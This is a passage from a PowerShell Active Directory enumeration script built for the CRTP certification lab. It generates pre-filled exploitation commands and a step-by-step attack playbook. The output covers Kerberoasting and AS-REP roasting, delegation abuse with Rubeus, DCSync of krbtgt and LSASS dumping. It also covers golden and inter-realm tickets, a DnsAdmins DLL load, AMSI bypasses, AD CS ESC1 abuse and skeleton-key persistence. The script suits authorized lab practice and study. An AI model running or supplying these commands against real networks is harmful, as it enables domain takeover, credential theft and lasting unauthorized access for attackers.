        Save '21_sharpenum.txt' $out
    }

    # ---------------- SUMMARY ----------------
    Sect "Writing ranked summary"
    $high = @($summary | Where-Object { $_ -like '`[HIGH`]*' })
    $med  = @($summary | Where-Object { $_ -like '`[MED *' })
    $inf  = @($summary | Where-Object { $_ -like '`[INFO`]*' })

    $s = @()
    $s += "============================================================================"
    $s += " CRTP ENUMERATION SUMMARY   -   $Domain"
    $s += " Ran by $(whoami) on $(hostname)   |   $(Get-Date)"
    $s += "============================================================================"
    $s += ""
    $s += "HOW TO READ THIS (beginner-friendly):"
    $s += "  * Findings are ranked. Start at HIGH, then MED. INFO is context."
    $s += "      HIGH = a direct attack path (do these first)"
    $s += "      MED  = useful / needs a step first"
    $s += "      INFO = background facts"
    $s += "  * For the EXACT command per finding -> open EXPLOIT_COMMANDS.txt"
    $s += "  * For the full start-to-finish walkthrough -> open CRTP-Playbook.txt"
    $s += "  * Everything in one file -> _ALL.txt   |   what's new since last run -> NEW_this_run.txt"
    $s += "  * Counts this run:  HIGH=$($high.Count)  MED=$($med.Count)  INFO=$($inf.Count)"
    $s += ("=" * 76)
    $s += "`n### HIGH  ($($high.Count))  -- exploit these first ###"
    $s += $(if ($high.Count){ $high } else { "  (none this run)" })
    $s += "`n### MEDIUM ($($med.Count)) ###"
    $s += $(if ($med.Count){ $med } else { "  (none this run)" })
    $s += "`n### INFO ($($inf.Count)) ###"
    $s += $(if ($inf.Count){ $inf } else { "  (none this run)" })
    $s += "`n" + ("=" * 76)
    $s += "NEXT-STEP CHEAT (finding type -> action; full commands in EXPLOIT_COMMANDS.txt):"
    $s += " Kerberoast    : Rubeus.exe kerberoast /outfile:hashes.txt   -> hashcat -m 13100"
    $s += " AS-REP roast  : Rubeus.exe asreproast /format:hashcat       -> hashcat -m 18200"
    $s += " Unconstrained : capture TGTs on that host (Rubeus monitor/triage), coerce a DC:"
    $s += "                 MS-RPRN.exe / WSPCoerce.exe / DFSCoerce-andrea.exe <attacker> <victim-DC>"
    $s += " Local privesc : PowerUp Invoke-PrivescAudit -> Invoke-ServiceAbuse / Write-ServiceBinary; or PrivEscCheck"
    $s += " Interesting shares : loot creds/configs, then reuse; RACE.ps1 to drop ACL backdoors post-DA"
    $s += " Constrained   : Rubeus.exe s4u /user: /rc4: /impersonateuser:administrator /msdsspn: /ptt"
    $s += " RBCD / MAQ>0  : add machine acct -> set msDS-AllowedToActOnBehalfOfOtherIdentity -> Rubeus s4u"
    $s += " AD CS         : Certify.exe find /vulnerable -> ESC1/ESC8 -> Rubeus asktgt /certificate"
    $s += " Dangerous ACL : abuse GenericAll/WriteDacl (reset pwd / add to group / targeted Kerberoast)"
    $s += " GPP cpassword : gpp-decrypt the found cpassword"
    $s += " Trusts        : inter-realm TGT / golden trust ticket for cross-domain, cross-forest with SID history"
    $s += " Deep paths    : run SharpHound -> BloodHound for shortest path to Domain/Enterprise Admin"
    Save '00_SUMMARY.txt' $s

    # ---------------- EXPLOITATION COMMANDS (per finding, pre-filled) ----------------
    Sect "Generating exploitation commands"
    $dom = $Domain
    $shortDom = ($Domain -split '\.')[0]
    $c = @()
    $c += "============================================================================"
    $c += " EXPLOITATION COMMANDS  -  built from THIS run's confirmed findings"
    $c += " Domain: $dom      Generated: $(Get-Date)"
    $c += "============================================================================"
    $c += ""
    $c += "HOW TO USE (beginner-friendly):"
    $c += "  * Each numbered block below = ONE finding the script confirmed."
    $c += "  * Read GOAL (what it gets you), then run the lines under RUN top-to-bottom."
    $c += "  * Replace anything in <angle-brackets> with your real value (legend below)."
    $c += "  * Run all tools INSIDE your InviShell shell (see CRTP-Playbook.txt, Phase 0)."
    $c += ""
    $c += "PLACEHOLDER LEGEND:"
    $c += "  <wordlist>        password list, e.g. rockyou.txt"
    $c += "  <NTLM>            NTLM hash of that account (from a dump, or after cracking)"
    $c += "  <DC-FQDN>         a Domain Controller (this domain: $dc)"
    $c += "  <controlled-acct> an account/computer you ALREADY control"
    $c += "  <pfxpass>         a password you choose when converting a cert to .pfx"
    $c += "  administrator     the user you impersonate (swap for another DA if needed)"
    $c += ""
    $c += "Authorized CRTP lab / your own AD only."
    $c += ("=" * 76)

    # de-dup identical entries
    $ei = 0
    $seenE = @{}
    foreach($e in $expl){
        $key = "$($e.Type)|" + (($e.Data.GetEnumerator() | Sort-Object Name | ForEach-Object { "$($_.Key)=$($_.Value)" }) -join ';')
        if ($seenE[$key]) { continue }; $seenE[$key] = $true
        $d = $e.Data
        $ei++
        switch ($e.Type) {
            'Kerberoast' {
                $c += "`n[$ei] KERBEROAST  ->  user: $($d.User)"
                $c += "     GOAL: crack this service account's password offline (often privileged)."
                $c += "     RUN :"
                $c += "       Rubeus.exe kerberoast /user:$($d.User) /nowrap /outfile:kerb_$($d.User).txt"
                $c += "       hashcat -m 13100 kerb_$($d.User).txt <wordlist> --force"
                $c += "     NEXT: log in / run tools as $($d.User) with the cracked password."
            }
            'ASREP' {
                $c += "`n[$ei] AS-REP ROAST  ->  user: $($d.User)"
                $c += "     GOAL: crack this account's password (it has no Kerberos pre-auth)."
                $c += "     RUN :"
                $c += "       Rubeus.exe asreproast /user:$($d.User) /format:hashcat /nowrap /outfile:asrep_$($d.User).txt"
                $c += "       hashcat -m 18200 asrep_$($d.User).txt <wordlist> --force"
                $c += "     NEXT: use the cracked password as $($d.User)."
            }
            'UnconstrainedUser' {
                $c += "`n[$ei] UNCONSTRAINED DELEGATION (account)  ->  $($d.User)"
                $c += "     GOAL: capture TGTs that get delegated to this account."
                $c += "     RUN :"
                $c += "       Rubeus.exe monitor /interval:5 /nowrap"
                $c += "     NEXT: when a DC/admin TGT appears, /ptt it, then DCSync (block below)."
            }
            'UnconstrainedHost' {
                $c += "`n[$ei] UNCONSTRAINED DELEGATION (host)  ->  $($d.Host)"
                $c += "     GOAL: force the DC to send its TGT here, then reuse it as the DC."
                $c += "     RUN  (on $($d.Host); you need local admin there):"
                $c += "       Rubeus.exe monitor /interval:5 /nowrap        # watches for incoming TGTs"
                $c += "       # in a 2nd shell, coerce the DC to authenticate to this host:"
                $c += "       MS-RPRN.exe \\<DC-FQDN> \\$($d.Host)           # or WSPCoerce.exe / DFSCoerce-andrea.exe"
                $c += "     NEXT: Rubeus.exe ptt /ticket:<captured-DC.kirbi>  then DCSync."
            }
            'ConstrainedUser' {
                $c += "`n[$ei] CONSTRAINED DELEGATION (account)  ->  $($d.User)"
                $c += "     GOAL: impersonate administrator to the allowed service ($($d.SPN))."
                $c += "     RUN :"
                $c += "       Rubeus.exe s4u /user:$($d.User) /rc4:<NTLM> /impersonateuser:administrator /msdsspn:$(($d.SPN -split ',')[0]) /ptt"
                $c += "     NEXT: you hold a ticket as administrator to that service - use it."
            }
            'ConstrainedHost' {
                $c += "`n[$ei] CONSTRAINED DELEGATION (host)  ->  $($d.Host)"
                $c += "     GOAL: impersonate administrator to the allowed service ($($d.SPN))."
                $c += "     RUN  (<NTLM> = the machine account hash of $($d.Host)):"
                $c += "       Rubeus.exe s4u /user:$($d.Host)`$ /rc4:<NTLM> /impersonateuser:administrator /msdsspn:$(($d.SPN -split ',')[0]) /ptt"
                $c += "     NEXT: access that service as administrator."
            }
            'RBCD' {
                $c += "`n[$ei] RESOURCE-BASED CONSTRAINED DELEGATION  ->  $($d.Host)"
                $c += "     GOAL: impersonate administrator to $($d.Host) via an account you control."
                $c += "     RUN :"
                $c += "       Rubeus.exe s4u /user:<controlled-acct>`$ /rc4:<NTLM> /impersonateuser:administrator /msdsspn:cifs/$($d.Host) /ptt"
                $c += "     NEXT: access \\$($d.Host)\c`$ as administrator."
            }
            'MAQ' {
                $c += "`n[$ei] MACHINE ACCOUNT QUOTA = $($d.Quota)  ->  you can add computer accounts"
                $c += "     GOAL: create a machine you control, then use it for an RBCD attack."
                $c += "     RUN :"
                $c += "       # 1) add a machine account (Powermad):"
                $c += "       New-MachineAccount -MachineAccount evilpc -Password (ConvertTo-SecureString 'Pass123!' -AsPlainText -Force)"
                $c += "       # 2) set RBCD on <target> to allow evilpc`$, then run the RBCD s4u (block above)."
                $c += "     NEXT: see the RBCD block for the s4u command."
            }
            'ADCS' {
                $c += "`n[$ei] AD CS PRESENT  ->  CA: $($d.CA) on $($d.Host)"
                $c += "     GOAL: find a vulnerable certificate template to abuse."
                $c += "     RUN :"
                $c += "       Certify.exe find /vulnerable"
                $c += "     NEXT: if a template is flagged, follow the ESC1 block below."
            }
            'DCSync' {
                $c += "`n[$ei] DCSYNC RIGHTS  ->  principal: $($d.Principal)"
                $c += "     GOAL: pull password hashes (incl. krbtgt) straight from the DC."
                $c += "     RUN  (as $($d.Principal)):"
                $c += "       Invoke-Mimi -Command '`"lsadump::dcsync /user:$shortDom\krbtgt`"'"
                $c += "       Invoke-Mimi -Command '`"lsadump::dcsync /user:$shortDom\administrator`"'"
                $c += "     NEXT: krbtgt hash -> golden ticket (see CRTP-Playbook Phase 5/6)."
            }
            'LAPS' {
                $c += "`n[$ei] LAPS PASSWORD READABLE  ->  host: $($d.Host)"
                $c += "     GOAL: log in as local admin using the plaintext password below."
                $c += "     PWD : $($d.Pwd)"
                $c += "     RUN :"
                $c += "       WSManWinRM.exe $($d.Host) `"whoami`" .\administrator $($d.Pwd)"
                $c += "     NEXT: or use runas / PSRemoting as .\administrator with that password."
            }
            'GPP' {
                $c += "`n[$ei] GPP CPASSWORD  ->  file: $($d.File)"
                $c += "     GOAL: decrypt the stored password (Microsoft's AES key is public)."
                $c += "     RUN :"
                $c += "       Get-GPPPassword        # PowerSploit - auto-decrypts"
                $c += "       # or:  gpp-decrypt <cpassword-string-from-that-file>"
                $c += "     NEXT: use the recovered credential."
            }
            'Priv_SeImpersonatePrivilege' {
                $c += "`n[$ei] TOKEN PRIV: SeImpersonate (on $env:COMPUTERNAME)  ->  local SYSTEM"
                $c += "     GOAL: escalate from admin/service account to SYSTEM on this host."
                $c += "     RUN :"
                $c += "       PrintSpoofer.exe -i -c cmd.exe        # or: GodPotato -cmd `"cmd /c whoami`""
                $c += "     NEXT: from SYSTEM, dump creds / continue."
            }
            'Priv_SeBackupPrivilege' {
                $c += "`n[$ei] TOKEN PRIV: SeBackup  ->  read protected files"
                $c += "     GOAL: read SAM/SYSTEM (or NTDS.dit on a DC) for offline creds."
                $c += "     RUN :"
                $c += "       reg save HKLM\SAM C:\Users\Public\sam.save"
                $c += "       reg save HKLM\SYSTEM C:\Users\Public\system.save"
                $c += "     NEXT: secretsdump offline; on a DC use diskshadow to grab NTDS.dit."
            }
            'Priv_SeDebugPrivilege' {
                $c += "`n[$ei] TOKEN PRIV: SeDebug  ->  dump LSASS"
                $c += "     GOAL: extract logged-on credentials from memory."
                $c += "     RUN :"
                $c += "       FindLSASSPID.exe"
                $c += "       minidumpdotnet.exe <lsass-pid> C:\Users\Public\lsass.dmp"
                $c += "     NEXT: parse lsass.dmp offline (mimikatz sekurlsa::minidump)."
            }
            'DumpTarget' {
                $c += "`n[$ei] GO HERE  ->  $($d.Host)  (you're admin AND $($d.PrivUser) is logged on)"
                $c += "     GOAL: steal that privileged user's credentials from this box."
                $c += "     RUN  (remote to $($d.Host) via PSRemoting/WSManWinRM):"
                $c += "       FindLSASSPID.exe ; minidumpdotnet.exe <pid> C:\Users\Public\lsass.dmp"
                $c += "     NEXT: pull the .dmp back, parse offline -> use $($d.PrivUser)'s creds."
            }
            'GMSA' {
                $c += "`n[$ei] gMSA READABLE  ->  account: $($d.Account)"
                $c += "     GOAL: read the managed password and use its NTLM hash."
                $c += "     RUN :"
                $c += "       `$g = Get-ADServiceAccount -Identity $($d.Account) -Properties 'msDS-ManagedPassword'"
                $c += "       # decode the blob: ConvertFrom-ADManagedPasswordBlob  (or GMSAPasswordReader.exe)"
                $c += "     NEXT: use the NTLM with Rubeus /rc4 (overpass-the-hash)."
            }
            'MSSQL' {
                $c += "`n[$ei] MSSQL ACCESSIBLE  ->  $($d.Instance)"
                $c += "     GOAL: run OS commands via SQL (xp_cmdshell), possibly via linked servers."
                $c += "     RUN :"
                $c += "       Get-SQLServerLinkCrawl -Instance $($d.Instance) -Query 'exec master..xp_cmdshell ''whoami'''"
                $c += "     NEXT: chain to the box running as the SQL service account."
            }
            'ESC1' {
                $c += "`n[$ei] AD CS ESC1  ->  template: $($d.Template)"
                $c += "     GOAL: request a certificate AS administrator, then log in with it."
                $c += "     RUN :"
                $c += "       Certify.exe request /ca:<DC-FQDN>\<CA-name> /template:$($d.Template) /altname:administrator"
                $c += "       # convert the returned cert.pem -> cert.pfx (openssl), then:"
                $c += "       Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:<pfxpass> /ptt"
                $c += "     NEXT: you now hold a TGT as administrator."
            }
            default { }
        }
    }
    if ($expl.Count -eq 0){ $c += "`n(no auto-exploitable findings captured this run)" }
    Save 'EXPLOIT_COMMANDS.txt' $c
    Log " Exploitation commands: $run\EXPLOIT_COMMANDS.txt" 'Magenta'

    # ---------------- PHASE PLAYBOOK (every CRTP scenario, pre-filled) ----------------
    Sect "Generating phase-by-phase playbook"
    $sid  = if ($g_domainSID) { $g_domainSID } else { '<domain-SID>' }
    $par  = if ($g_parent)    { $g_parent }    else { '<parent-domain>' }
    $fst  = if ($g_forest)    { $g_forest }    else { '<forest-root>' }
    $dc   = if ($g_dc)        { $g_dc }        else { '<DC-FQDN>' }
    $pb = @()
    $pb += "============================================================================"
    $pb += " CRTP PHASE PLAYBOOK   -   $Domain"
    $pb += " Generated $(Get-Date)"
    $pb += "============================================================================"
    $pb += ""
    $pb += "WHAT THIS IS: a beginner-friendly, start-to-finish walkthrough of a CRTP"
    $pb += "engagement. Do the phases IN ORDER. Each step says what to RUN and what to"
    $pb += "EXPECT. It's a GUIDE - you run the commands yourself (the script does not)."
    $pb += ""
    $pb += "AUTO-FILLED FROM THIS DOMAIN:"
    $pb += "   Domain      : $Domain"
    $pb += "   Domain SID  : $sid"
    $pb += "   Parent      : $par"
    $pb += "   Forest root : $fst"
    $pb += "   A DC        : $dc"
    $pb += ""
    $pb += "LEGEND: <hash>=NTLM hash  <svc>=service account  <spn>=service SPN"
    $pb += "        <target>=victim host  <share>=UNC path you control  <vuln>=template"
    $pb += "Authorized CRTP lab / your own AD only."
    $pb += ("=" * 76)

    $pb += "`n############################################################################"
    $pb += "# PHASE 0 - FOOTHOLD & OPSEC"
    $pb += "############################################################################"
    $pb += "GOAL : get a working shell and load tools without tripping AMSI/logging."
    $pb += "STEPS:"
    $pb += "  1) Start an InviShell shell (no admin needed):"
    $pb += "       D:\CRTP\Tools\InviShell\RunWithRegistryNonAdmin.bat"
    $pb += "  2) (only if loading other .ps1) run the bypasses: Amsi-Byp.txt ; sbloggingbypass.txt"
    $pb += "  3) See what defenses exist:  Invoke-EDRChecker      (or Seatbelt.exe -group=all)"
    $pb += "EXPECT: a shell where you can Import-Module PowerView / PowerUp, etc."

    $pb += "`n############################################################################"
    $pb += "# PHASE 1 - LOCAL PRIVILEGE ESCALATION  (become admin/SYSTEM on this box)"
    $pb += "############################################################################"
    $pb += "GOAL : go from normal user to local admin / SYSTEM."
    $pb += "STEPS:"
    $pb += "  1) Enumerate:  SharpUp.exe audit    (or Invoke-PrivescAudit / winPEAS)"
    $pb += "  2) If you have SeImpersonate:  PrintSpoofer.exe -i -c cmd.exe   (or GodPotato)"
    $pb += "  3) Weak/unquoted service:  Invoke-ServiceAbuse -Name <svc> -Command 'net user ...'"
    $pb += "EXPECT: a SYSTEM/admin shell. (Skip this phase if you already are admin.)"

    $pb += "`n############################################################################"
    $pb += "# PHASE 2 - DOMAIN RECON  (map the domain)"
    $pb += "############################################################################"
    $pb += "GOAL : find who/what is vulnerable across the domain."
    $pb += "STEPS:"
    $pb += "  1) .\Invoke-CRTPEnum.ps1 -Domain $Domain -OutDir C:\Users\Public\loot"
    $pb += "  2) Read 00_SUMMARY.txt (HIGH first) and EXPLOIT_COMMANDS.txt."
    $pb += "  3) Optional graph:  .\Invoke-CRTPEnum.ps1 -Domain $Domain -BloodHound"
    $pb += "EXPECT: a ranked list of leads + a ready command for each one."

    $pb += "`n############################################################################"
    $pb += "# PHASE 3 - HARVEST DOMAIN CREDENTIALS"
    $pb += "############################################################################"
    $pb += "GOAL : get a domain user's password/hash to move with."
    $pb += "STEPS (pick what the recon found):"
    $pb += "  1) Kerberoast: Rubeus.exe kerberoast /nowrap /outfile:k.txt ; hashcat -m 13100 k.txt <wordlist>"
    $pb += "  2) AS-REP:     Rubeus.exe asreproast /format:hashcat /nowrap /outfile:a.txt ; hashcat -m 18200 a.txt <wordlist>"
    $pb += "  3) Look for secrets in user description/info and GPP cpassword (05_gpo.txt)."
    $pb += "EXPECT: at least one cracked/looted credential."

    $pb += "`n############################################################################"
    $pb += "# PHASE 4 - DOMAIN PRIVILEGE ESCALATION"
    $pb += "############################################################################"
    $pb += "GOAL : turn a normal domain foothold into high privilege."
    $pb += "OPTIONS (use whichever the recon flagged; commands are in EXPLOIT_COMMANDS.txt):"
    $pb += "  * Constrained deleg : Rubeus.exe s4u /user:<svc> /rc4:<hash> /impersonateuser:administrator /msdsspn:<spn> /ptt"
    $pb += "  * Unconstrained host: Rubeus.exe monitor ; then coerce a DC -> MS-RPRN.exe \\$dc \\<unconstrained-host>"
    $pb += "  * RBCD              : add/own a machine acct -> set RBCD -> Rubeus s4u /msdsspn:cifs/<target> /ptt"
    $pb += "  * Dangerous ACL     : Set-DomainUserPassword / Add-DomainGroupMember (on the object you control)"
    $pb += "  * DnsAdmins         : dnscmd $dc /config /serverlevelplugindll \\<share>\evil.dll ; restart DNS on the DC"
    $pb += "  * AD CS ESC1        : Certify.exe request /ca:<ca> /template:<vuln> /altname:administrator -> Rubeus asktgt /certificate"
    $pb += "EXPECT: admin rights on a server, or a ticket as a privileged user."

    $pb += "`n############################################################################"
    $pb += "# PHASE 5 - DOMAIN ADMIN / DC COMPROMISE"
    $pb += "############################################################################"
    $pb += "GOAL : own the domain (get krbtgt / DA)."
    $pb += "STEPS:"
    $pb += "  1) DCSync (if you have the right):  Invoke-Mimi -Command '`"lsadump::dcsync /user:$($shortDom)\krbtgt`"'"
    $pb += "  2) Or dump LSASS on a box with a DA session: FindLSASSPID.exe ; minidumpdotnet.exe <pid> C:\Users\Public\lsass.dmp"
    $pb += "  3) Or NTDS.dit (SeBackup on DC): diskshadow -> copy ntds.dit + SYSTEM -> secretsdump offline"
    $pb += "EXPECT: the krbtgt hash and/or DA credentials."

    $pb += "`n############################################################################"
    $pb += "# PHASE 6 - CHILD -> PARENT  (same forest, SID history)"
    $pb += "############################################################################"
    $pb += "GOAL : jump from this child domain to the parent ($par) as Enterprise Admin."
    $pb += "NEED : child krbtgt hash (Phase 5), child SID = $sid, parent EA SID = <parent-SID>-519"
    $pb += "STEPS:"
    $pb += "  1) Get parent SID:  Get-ADDomain -Server $par | select DomainSID"
    $pb += "  2) Forge golden ticket with SID history:"
    $pb += "       Invoke-Mimi -Command '`"kerberos::golden /user:Administrator /domain:$Domain /sid:$sid /krbtgt:<child-krbtgt-hash> /sids:<parent-SID>-519 /ptt`"'"
    $pb += "  3) Verify:  ls \\$par-dc\c`$"
    $pb += "EXPECT: file access on the parent DC as EA. Then re-run this tool with -Domain $par."

    $pb += "`n############################################################################"
    $pb += "# PHASE 7 - CROSS-FOREST  (trust key abuse)"
    $pb += "############################################################################"
    $pb += "GOAL : reach the other forest ($fst) via the trust."
    $pb += "NEED : inter-realm TRUST KEY (dcsync the trust account, or lsadump::trust /patch on the DC)"
    $pb += "STEPS:"
    $pb += "  1) Forge an inter-realm TGT:"
    $pb += "       Invoke-Mimi -Command '`"kerberos::golden /user:Administrator /domain:$Domain /sid:$sid /rc4:<trust-key> /service:krbtgt /target:$fst /ticket:trust.kirbi`"'"
    $pb += "  2) Get a service ticket:  Rubeus.exe asktgs /service:cifs/<forest-dc> /ticket:trust.kirbi /ptt"
    $pb += "EXPECT: access to a specific resource in $fst."
    $pb += "NOTE : SID filtering usually blocks EA across a forest trust - target specific SPNs/resources."

    $pb += "`n############################################################################"
    $pb += "# PHASE 8 - PERSISTENCE  (post-DA, lab practice only)"
    $pb += "############################################################################"
    $pb += "GOAL : keep access for the lab exercise."
    $pb += "OPTIONS:"
    $pb += "  * Golden ticket (krbtgt hash)  /  Silver ticket (service-acct hash, targeted)"
    $pb += "  * Skeleton key:  Invoke-Mimi -Command '`"misc::skeleton`"'   (on DC, memory-only)"
    $pb += "  * DSRM abuse ; AdminSDHolder+SDProp ; ACL backdoors via RACE.ps1"
    $pb += "EXPECT: a durable way back in for the report."

    $pb += "`n" + ("=" * 76)
    $pb += "REMEMBER: this file = the manual walkthrough.  EXPLOIT_COMMANDS.txt = the exact"
    $pb += "commands for the findings in THIS run.  Re-run the tool after every new access."
    Save 'CRTP-Playbook.txt' $pb
    Log " Phase playbook       : $run\CRTP-Playbook.txt" 'Magenta'

    # ---------------- MASTER findings (dedup, accumulates across runs) ----------------
    try {
        $master = Join-Path $OutDir '_MASTER_findings.txt'
        $existing = @()
        if (Test-Path $master){ $existing = Get-Content $master }
        $existingSet = New-Object System.Collections.Generic.HashSet[string]
        foreach($e in $existing){ [void]$existingSet.Add(($e -replace '^\S+\s+','')) }  # strip leading timestamp for dedup
        $new = @()
        foreach($h in ($high + $med)){
            if (-not $existingSet.Contains($h)){ $new += ("{0} {1}" -f (Get-Date -Format 'MM-dd_HH:mm'), $h) }
        }
        if ($new){
            if (-not (Test-Path $master)){ "# CRTP MASTER FINDINGS (HIGH+MED, deduped across runs)`n" | Out-File $master -Encoding UTF8 }
            $new | Out-File $master -Append -Encoding UTF8
            Log " Appended $($new.Count) new finding(s) to $master" 'DarkGreen'
        }

        # DELTA: what THIS run/identity surfaced that was never seen before.
        # (Re-run as a new user -> this shows only the newly-gained access.)
        $newBare = @()
        foreach($h in ($high + $med)){ if (-not $existingSet.Contains($h)){ $newBare += $h } }
        $deltaFile = Join-Path $run 'NEW_this_run.txt'
        if ($newBare){
            $hdr = @("NEW THIS RUN ($($newBare.Count)) - not seen in prior runs (as $(whoami))","$(Get-Date)", ("-"*60))
            ($hdr + $newBare) | Out-File $deltaFile -Encoding UTF8
            Log "`n>>> NEW this run ($($newBare.Count)) - access this identity gained:" 'Magenta'
            foreach($n in ($newBare | Select-Object -First 15)){ Log "    $n" 'Magenta' }
            if ($newBare.Count -gt 15){ Log "    ... (+$($newBare.Count-15) more in NEW_this_run.txt)" 'Magenta' }
        } else {
            "No new findings vs prior runs." | Out-File $deltaFile -Encoding UTF8
            Log " No NEW findings vs prior runs (nothing this identity sees is new)." 'DarkGray'
        }
    } catch {}

    # ---------------- HTML report ----------------
    try {
        function Enc($t){ ("$t" -replace '&','&amp;' -replace '<','&lt;' -replace '>','&gt;') }
        $rows = ''
        foreach($h in $high){ $rows += "<tr class='hi'><td>HIGH</td><td>$(Enc ($h -replace '^\[HIGH\]\s*',''))</td></tr>`n" }
        foreach($m in $med){  $rows += "<tr class='me'><td>MED</td><td>$(Enc ($m -replace '^\[MED \]\s*',''))</td></tr>`n" }
        foreach($i in $inf){  $rows += "<tr class='in'><td>INFO</td><td>$(Enc ($i -replace '^\[INFO\]\s*',''))</td></tr>`n" }
        $html = @"
<!doctype html><html><head><meta charset='utf-8'><title>CRTP Enum - $Domain</title>
<style>
body{font-family:Segoe UI,Arial,sans-serif;background:#0d1117;color:#e6edf3;margin:24px}
h1{color:#58a6ff}.meta{color:#8b949e;font-size:13px;margin-bottom:16px}
table{border-collapse:collapse;width:100%}td{padding:6px 10px;border-bottom:1px solid #21262d;vertical-align:top}
td:first-child{white-space:nowrap;font-weight:bold;width:70px}
tr.hi td:first-child{color:#ff7b72}tr.me td:first-child{color:#e3b341}tr.in td:first-child{color:#8b949e}
tr.hi{background:#2d1416}tr:hover{background:#161b22}
.count{display:inline-block;margin-right:14px;padding:3px 10px;border-radius:12px;background:#21262d}
</style></head><body>
<h1>CRTP Enumeration &mdash; $Domain</h1>
<div class='meta'>Ran by $(whoami) on $(hostname) &middot; $(Get-Date)<br>
<span class='count' style='color:#ff7b72'>HIGH $($high.Count)</span>
<span class='count' style='color:#e3b341'>MED $($med.Count)</span>
<span class='count' style='color:#8b949e'>INFO $($inf.Count)</span></div>
<table>$rows</table></body></html>
"@
        $html | Out-File (Join-Path $run '00_SUMMARY.html') -Encoding UTF8
    } catch {}

    # ---------------- INDEX (what's in each file, and which have data) ----------------
    try {
        $desc = @{
            '00_context'          = 'Your token: privileges (SeImpersonate/SeBackup/SeDebug), group membership'
            '00b_edr'             = 'Defensive products (AV/EDR) detected on this host'
            '01_domain_trusts'    = 'Domain, forest, DCs, trusts + SID filtering'
            '02_users'            = 'Users; see 02a kerberoastable, 02b adminCount'
            '02a_kerberoastable'  = 'Users with SPNs (Kerberoast targets)'
            '02b_admincount'      = 'adminCount=1 (protected/privileged) users'
            '03_computers'        = 'Delegation (unconstrained/constrained/RBCD), MAQ, legacy OS'
            '04_priv_groups'      = 'DA/EA/Admins/DnsAdmins... recursive membership'
            '05_gpo'              = 'GPOs + SYSVOL cpassword scan'
            '06_adcs'             = 'Enterprise CA + published templates'
            '06b_password_policy' = 'Lockout/min-length -> is spraying safe?'
            '06c_dcsync_rights'   = 'Who can DCSync (non-default = HIGH)'
            '06d_laps'            = 'Readable LAPS local-admin passwords'
            '07_acls'             = 'Dangerous ACLs (GenericAll/WriteDacl...)'
            '08_localadmin'       = 'Hosts where you have local admin'
            '09_spns'             = 'Domain SPN inventory'
            '10_mssql'            = 'MSSQL SPNs'
            '12_shares'           = 'Readable shares + interesting files'
            '13_local_privesc'    = 'PowerUp/PrivEscCheck local privesc + cached GPP'
            '13b_winpeas'         = 'winPEAS deep local triage (opt-in)'
            '14_attack_paths'     = 'Admin x privileged-session correlation (GO HERE)'
            '15_gmsa'             = 'gMSA + whether you can read their passwords'
            '16_foreign_trust'    = 'Cross-trust foreign principals + trust map'
            '17_gpo_localadmin'   = 'Who is admin where (via GPO, pure LDAP)'
            '18_mssql_crawl'      = 'PowerUpSQL MSSQL link crawl (opt-in)'
            '19_bloodhound'       = 'SharpHound collection for BloodHound (opt-in)'
            '11_trusted_domains'  = 'Recon across trusted domains (-IncludeForest)'
        }
        $idx = @()
        $idx += "INDEX - $Domain - $(Get-Date)"
        $idx += "HIGH=$($high.Count)  MED=$($med.Count)  INFO=$($inf.Count)"
        $idx += "Read order: 00_SUMMARY.txt -> EXPLOIT_COMMANDS.txt -> flagged (*) sections below"
        $idx += ("-" * 64)
        foreach($f in (Get-ChildItem $run -File | Sort-Object Name)){
            $base = $f.BaseName
            $mark = if ($f.Length -gt 60) { '*' } else { ' ' }   # * = has data worth opening
            $d = if ($desc.ContainsKey($base)) { $desc[$base] } elseif ($base -like '00_SUMMARY*'){ 'Ranked findings + cheat' } elseif ($base -eq 'EXPLOIT_COMMANDS'){ 'Pre-filled command per finding' } else { '' }
            $idx += ("[{0}] {1,-22} {2}" -f $mark, $f.Name, $d)
        }
        $idx += ("-" * 64)
        $idx += "* = file has data.  Blank = section ran but found nothing."
        Save '_INDEX.txt' $idx
    } catch {}

    # ---------------- _ALL.txt : every section dump merged into ONE file ----------------
    try {
        $all = @()
        $all += "CRTP ENUM - ALL DATA (merged)   Domain: $Domain   $(Get-Date)"
        $all += "Ran by $(whoami) on $(hostname)"
        $all += ("#" * 72)
        # logical order: summary + commands + playbook first, then numbered sections
        $order = Get-ChildItem $run -File |
                 Where-Object { $_.Name -ne '_ALL.txt' -and $_.Extension -notin @('.html','.zip','.dmp','.bin') } |
                 Sort-Object @{e={ if ($_.Name -like '00_SUMMARY*'){'0'} elseif ($_.Name -eq 'EXPLOIT_COMMANDS.txt'){'1'} elseif ($_.Name -eq 'CRTP-Playbook.txt'){'2'} elseif ($_.Name -eq 'NEW_this_run.txt'){'3'} else {'5'+$_.Name} }}, Name
        foreach($file in $order){
            $all += "`n`n" + ("=" * 72)
            $all += "==== $($file.Name) ===="
            $all += ("=" * 72)
            $all += (Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue)
        }
        Save '_ALL.txt' $all
        Log " ALL merged  : $run\_ALL.txt   (everything in one file)" 'Green'
    } catch {}

    # ---------------- optional: zip the run folder ----------------
    if ($Zip) {
        try {
            $zipPath = "$run.zip"
            if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
            Add-Type -AssemblyName System.IO.Compression.FileSystem
            [System.IO.Compression.ZipFile]::CreateFromDirectory($run, $zipPath)
            Log " Zipped     : $zipPath" 'Green'
        } catch { Log " (zip failed: $_)" 'DarkGray' }
    }

    Log "`n============================================================" 'Green'
    Log " DONE.  HIGH=$($high.Count)  MED=$($med.Count)  INFO=$($inf.Count)" 'Green'
    Log " Read first : $run\00_SUMMARY.txt   (or .html)" 'Green'
    Log " Index      : $run\_INDEX.txt   (* = has data)" 'Green'
    Log " Commands   : $run\EXPLOIT_COMMANDS.txt" 'Green'
    Log " Master log : $OutDir\_MASTER_findings.txt" 'Green'
    Log "============================================================" 'Green'
}

# ---- Auto-run when the script is executed DIRECTLY (not dot-sourced) ----
# Direct:      .\Invoke-CRTPEnum.ps1 -Domain corp.local -HostSweep   -> runs now
# Dot-sourced: . .\Invoke-CRTPEnum.ps1                                -> only defines the function
if ($MyInvocation.InvocationName -ne '.') {
    Invoke-CRTPEnum @PSBoundParameters
}
